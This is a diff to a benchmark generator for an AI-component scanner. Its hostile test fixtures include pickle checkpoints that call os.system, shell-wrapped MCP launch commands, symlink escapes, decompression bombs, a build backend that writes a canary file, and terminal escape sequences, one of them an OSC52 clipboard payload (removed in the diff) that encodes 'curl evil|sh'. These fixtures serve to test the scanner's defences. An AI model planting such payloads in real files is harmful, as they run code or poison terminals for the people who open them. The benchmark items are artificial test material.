@@ -287,6 +287,13 @@ class Corpus:
             checks=checks or [],
         )
 
+    def sentinel(
+        self, iid: str, kind_domain: str, sid: str, title: str, match: list[str], weight: int
+    ) -> None:
+        """A benign component in a hostile scenario; its kind words come from kind_domain."""
+        self.add(id=iid, scenario=sid, domain="safety", kind="component", title=title,
+                 match=match, weight=weight, kind_domain=kind_domain)  # fmt: skip
+
     def finding(
         self, iid: str, sid: str, domain: str, title: str, match: list[str], weight: int
     ) -> None:
@@ -338,7 +345,7 @@ def build_models(c: Corpus) -> None:
         f"acme/{base}.\n",
     )
     c.component(
-        "M01", s, "models", "SafeTensors weights with model card", [t], 3,
+        "M01", s, "models", "SafeTensors weights with model card", [t, sha256(st)], 3,
         [check("sha256", 2, sha256(st)), check("format", 1, "safetensors"),
          check("license", 1, "apache-2.0")],
     )  # fmt: skip
@@ -400,7 +407,7 @@ def build_models(c: Corpus) -> None:
         torch_zip("archive", pickle_call("os", "system", ("true",))),
     )
     c.component(
-        "M06", s, "models", "PyTorch pickle checkpoint", [t], 2,
+        "M06", s, "models", "PyTorch pickle checkpoint", [t, sha256(pt)], 2,
         [check("sha256", 1, sha256(pt))],
     )  # fmt: skip
     c.finding("M06F", s, "models", "Pickle checkpoint flagged as a code-executing format", [t], 1)
@@ -458,9 +465,11 @@ def build_models(c: Corpus) -> None:
             indent=2,
         ),
     )  # fmt: skip
-    c.write(s, f"adapters/{t}/adapter_model.safetensors", safetensors_bytes({"format": "pt"}))
+    ad = c.write(
+        s, f"adapters/{t}/adapter_model.safetensors", safetensors_bytes({"format": "pt", "r": "8"})
+    )
     c.component(
-        "M09", s, "models", "LoRA adapter with base-model lineage", [t], 2,
+        "M09", s, "models", "LoRA adapter with base-model lineage", [t, sha256(ad)], 2,
         [check("base", 2, b)],
     )  # fmt: skip
 
@@ -587,7 +596,7 @@ def build_data(c: Corpus) -> None:
         [check("revision", 1, rev)],
     )  # fmt: skip
     c.component(
-        "D02", s, "data", "Local training dataset with dataset card", [local], 2,
+        "D02", s, "data", "Local training dataset with dataset card", [local, sha256(jsonl)], 2,
         [check("sha256", 1, sha256(jsonl)), check("license", 1, "cc-by-4.0")],
     )  # fmt: skip
     c.component("D03", s, "data", "CSV dataset referenced by training code", [csvt], 1)
@@ -616,6 +625,40 @@ def build_packages(c: Corpus) -> None:
                     "@anthropic-ai/sdk": "0.52.0",
                     "ai": "4.3.0",
                 },
+            },
+            indent=2,
+        ),
+    )
+    lock_pkgs: dict[str, Any] = {
+        "": {
+            "name": "agent-web",
+            "version": "1.0.0",
+            "dependencies": {
+                "@modelcontextprotocol/sdk": "1.12.0",
+                "@anthropic-ai/sdk": "0.52.0",
+                "ai": "4.3.0",
+            },
+        }
+    }
+    for name, ver in [
+        ("@modelcontextprotocol/sdk", "1.12.0"),
+        ("@anthropic-ai/sdk", "0.52.0"),
+        ("ai", "4.3.0"),
+    ]:
+        lock_pkgs[f"node_modules/{name}"] = {
+            "version": ver,
+            "resolved": f"https://registry.npmjs.org/{name}/-/{name.split('/')[-1]}-{ver}.tgz",
+        }
+    c.write(
+        s,
+        "package-lock.json",
+        json.dumps(
+            {
+                "name": "agent-web",
+                "version": "1.0.0",
+                "lockfileVersion": 3,
+                "requires": True,
+                "packages": lock_pkgs,
             },
             indent=2,
         ),
@@ -1075,6 +1118,7 @@ def build_agents(c: Corpus) -> None:
 def build_hostile(c: Corpus) -> None:
     canary = c.root / "canary"
     c.safety["canary_dir"] = "canary"
+    c.safety["canary_path"] = str(canary)
 
     s = "s09a-pickle-exec"
     c.scenario(s, "Hostile: pickle payloads that write a canary when deserialized")
@@ -1088,8 +1132,8 @@ def build_hostile(c: Corpus) -> None:
     c.write(s, f"models/{sent}.safetensors", safetensors_bytes({"format": "pt"}))
     c.add(id="X01", requires=["X01S", "X01P"], scenario=s, domain="safety", kind="canary_absent", title="Pickle not executed",
           canaries=["pickle", "torch"], weight=4, gate="F")  # fmt: skip
-    c.component("X01S", s, "safety", "Graceful: benign sibling model still reported", [sent], 1)
-    c.component("X01P", s, "safety", "Observed: hostile pickles inventoried", [t, t2], 0)
+    c.sentinel("X01S", "models", s, "Graceful: benign sibling model still reported", [sent], 1)
+    c.sentinel("X01P", "models", s, "Observed: hostile pickles inventoried", [t, t2], 0)
     c.finding("X01F", s, "models", "Malicious pickle flagged", [t, t2], 2)
 
     s = "s09b-mcp-exec"
@@ -1111,8 +1155,8 @@ def build_hostile(c: Corpus) -> None:
     c.add(id="X02", requires=["X02S", "X02C"], scenario=s, domain="safety", kind="canary_absent",
           title="MCP launch command not executed in default mode", canaries=["mcp"], weight=4,
           gate="F")  # fmt: skip
-    c.component("X02S", s, "safety", "Graceful: sibling server reported", [sent], 1)
-    c.component("X02C", s, "safety", "Observed: shell-wrapped server inventoried", [t], 0)
+    c.sentinel("X02S", "mcp", s, "Graceful: sibling server reported", [sent], 1)
+    c.sentinel("X02C", "mcp", s, "Observed: shell-wrapped server inventoried", [t], 0)
     c.finding("X02F", s, "mcp", "Shell-wrapped launch command flagged", [t], 1)
 
     s = "s09c-symlink-escape"
@@ -1141,13 +1185,13 @@ def build_hostile(c: Corpus) -> None:
     c.add(id="X03", requires=["X03S", "X03M"], scenario=s, domain="safety", kind="outside_absent",
           title="Does not read through symlinks that leave the scan root",
           match=[out_srv, out_model], weight=3, gate="C")  # fmt: skip
-    c.component("X03S", s, "safety", "Graceful: in-root server reported", [sent], 1)
-    c.component("X03M", s, "safety", "Graceful: in-root model reported", [msent], 1)
+    c.sentinel("X03S", "mcp", s, "Graceful: in-root server reported", [sent], 1)
+    c.sentinel("X03M", "models", s, "Graceful: in-root model reported", [msent], 1)
 
     s = "s09d-terminal-injection"
     c.scenario(s, "Hostile: terminal control sequences in names and descriptions")
     t, sk = c.tok(), c.tok()
-    esc = f"\x1b]0;PWNED-{t}\x07\x1b]52;c;Y3VybCBldmlsfHNo\x07\x1b[2K"
+    esc = f"\x1b]0;PWNED-{t}\x07\x1b]52;c;QUlCT00tQkVOQ0ggT1NDNTIgVEVTVA==\x07\x1b[2K"
     c.write(
         s,
         ".mcp.json",
@@ -1161,8 +1205,8 @@ def build_hostile(c: Corpus) -> None:
     c.add(id="X04", requires=["X04S", "X04K"], scenario=s, domain="safety", kind="ansi_absent",
           title="Terminal control sequences from input are not echoed raw",
           patterns=["\x1b]0;PWNED", "\x1b]52;"], weight=2)  # fmt: skip
-    c.component("X04S", s, "safety", "Graceful: server still reported", [t], 1)
-    c.component("X04K", s, "safety", "Observed: skill with escape sequences inventoried", [sk], 0)
+    c.sentinel("X04S", "mcp", s, "Graceful: server still reported", [t], 1)
+    c.sentinel("X04K", "skills", s, "Observed: skill with escape sequences inventoried", [sk], 0)
 
     s = "s09e-resource-exhaustion"
     c.scenario(s, "Hostile: decompression bomb, header-length bomb, deeply nested JSON")
@@ -1194,9 +1238,9 @@ def build_hostile(c: Corpus) -> None:
     c.add(id="X06", requires=["X05S", "X05M", "X05B"], scenario=s, domain="safety", kind="bounded_memory",
           title="Peak RSS stays under 2 GiB on a 3 GiB decompression bomb", weight=2,
           limit_bytes=2 * 1024**3)  # fmt: skip
-    c.component("X05S", s, "safety", "Graceful: valid sibling config still reported", [sent], 1)
-    c.component("X05M", s, "safety", "Graceful: valid sibling model still reported", [msent], 1)
-    c.component("X05B", s, "safety", "Observed: bomb or header-bomb model inventoried",
+    c.sentinel("X05S", "mcp", s, "Graceful: valid sibling config still reported", [sent], 1)
+    c.sentinel("X05M", "models", s, "Graceful: valid sibling model still reported", [msent], 1)
+    c.sentinel("X05B", "models", s, "Observed: bomb or header-bomb model inventoried",
                 [bomb, hdr], 0)  # fmt: skip
 
     s = "s09f-build-exec"
@@ -1211,6 +1255,18 @@ def build_hostile(c: Corpus) -> None:
         f'setup(name="{sent}", version="0.1.0", install_requires=["transformers==4.46.3"])\n',
     )
     c.write(s, "requirements.txt", "-e .\ntransformers==4.46.3\n")
+    c.write(
+        s,
+        "pyproject.toml",
+        f'[project]\nname = "{sent}"\nversion = "0.1.0"\n\n'
+        '[build-system]\nrequires = []\nbuild-backend = "aibench_backend"\nbackend-path = ["."]\n',
+    )
+    c.write(
+        s,
+        "aibench_backend.py",
+        f"import pathlib\npathlib.Path({str(canary / 'pep517-backend')!r}).touch()\n"
+        "raise SystemExit('aibench backend: build refused')\n",
+    )
     msent = c.tok()
     c.write(s, f"models/{msent}.safetensors", safetensors_bytes({"format": "pt", "name": msent}))
     c.write(
@@ -1235,15 +1291,15 @@ def build_hostile(c: Corpus) -> None:
     )
     c.add(id="X09", requires=["X09S", "X09M"], scenario=s, domain="safety", kind="canary_absent",
           title="Project build and install scripts are not executed", detect_build_exec=True,
-          canaries=["setup-py", "npm-preinstall", "npm-prepare"], weight=4,
+          canaries=["setup-py", "npm-preinstall", "npm-prepare", "pep517-backend"], weight=4,
           gate="F")  # fmt: skip
-    c.component("X09S", s, "safety", "Graceful: project MCP server still inventoried", [sent], 1)
-    c.component("X09M", s, "safety", "Graceful: project model still inventoried", [msent], 1)
+    c.sentinel("X09S", "mcp", s, "Graceful: project MCP server still inventoried", [sent], 1)
+    c.sentinel("X09M", "models", s, "Graceful: project model still inventoried", [msent], 1)
 
     c.add(id="X07", requires=["C06"], scenario="s04-mcp", domain="safety", kind="secret_absent",
           title="Literal credentials are redacted from every output", weight=4,
           gate="D")  # fmt: skip
-    c.add(id="X08", requires=["C01", "C02", "C03", "C04", "C05", "C08", "C09", "C10"],
+    c.add(id="X08", requires_default_detection=True,
           scenario="*", domain="safety", kind="no_egress",
           title="No network connection attempts in default mode", weight=2)  # fmt: skip
 
